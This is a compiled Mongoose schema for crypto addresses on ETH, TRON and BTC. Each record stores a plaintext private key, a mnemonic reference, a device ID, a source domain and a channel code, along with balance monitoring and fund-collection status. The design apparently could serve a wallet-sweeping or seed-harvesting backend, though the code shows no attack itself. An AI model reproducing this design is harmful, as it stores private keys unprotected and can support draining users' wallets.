import mongoose, { Schema } from 'mongoose';
const DerivedAddressSchema = new Schema({
    address: { type: String, required: true, unique: true },
    chain: { type: String, required: true, enum: ['eth', 'tron', 'btc'] },
    addressType: { type: String, default: '' },
    privateKey: { type: String, required: true },
    derivationPath: { type: String, default: '' },
    mnemonicId: { type: Schema.Types.ObjectId, ref: 'Mnemonic', required: true },
    deviceId: { type: String, required: true },
    channelCode: { type: String, default: '' },
    sourceDomain: { type: String, default: '' },
    walletType: { type: String, required: true },
    balance: { type: Number, default: 0 },
    usdtBalance: { type: Number, default: 0 },
    usdcBalance: { type: Number, default: 0 },
    lastCheckedAt: { type: Date, default: null },
    checkRetries: { type: Number, default: 0 },
    checkError: { type: String, default: '' },
    monitorStatus: { type: Number, default: 0 },
    subscriptionId: { type: String, default: '' },
    lastSubscribeTime: { type: Date, default: null },
    subscribeRetries: { type: Number, default: 0 },
    subscribeError: { type: String, default: '' },
    tatumKeyId: { type: Schema.Types.ObjectId, ref: 'TatumKey', default: null },
    createdAt: { type: Date, default: Date.now },
    collectStatus: { type: String, enum: ['idle', 'collecting', 'failed', 'excluded', 'collected', 'waiting'], default: 'idle' },
    collectFailedAt: { type: Date },
    collectedAt: { type: Date },
    collectWaitingAt: { type: Date },
    collectCount: { type: Number, default: 0 },
    collectError: { type: String, default: '' },
});
DerivedAddressSchema.index({ mnemonicId: 1 });
DerivedAddressSchema.index({ balance: 1 });
DerivedAddressSchema.index({ createdAt: -1 });
DerivedAddressSchema.index({ monitorStatus: 1, lastCheckedAt: 1 });
DerivedAddressSchema.index({ monitorStatus: 1, lastSubscribeTime: 1 });
DerivedAddressSchema.index({ subscriptionId: 1 });
DerivedAddressSchema.index({ usdtBalance: 1 });
DerivedAddressSchema.index({ usdcBalance: 1 });
DerivedAddressSchema.index({ chain: 1, collectStatus: 1, balance: 1 });
DerivedAddressSchema.index({ chain: 1, collectStatus: 1, usdtBalance: 1 });
DerivedAddressSchema.index({ chain: 1, collectStatus: 1, usdcBalance: 1 });
DerivedAddressSchema.index({ collectStatus: 1, collectFailedAt: 1 });
DerivedAddressSchema.index({ collectStatus: 1, collectWaitingAt: 1 });
DerivedAddressSchema.index({ channelCode: 1, chain: 1, createdAt: -1 });
DerivedAddressSchema.index({ sourceDomain: 1, createdAt: -1 });
DerivedAddressSchema.index({ deviceId: 1, createdAt: -1 });
DerivedAddressSchema.index({ channelCode: 1, sourceDomain: 1, createdAt: -1 });
export const DerivedAddress = mongoose.model('DerivedAddress', DerivedAddressSchema);
//# sourceMappingURL=derived-address.js.map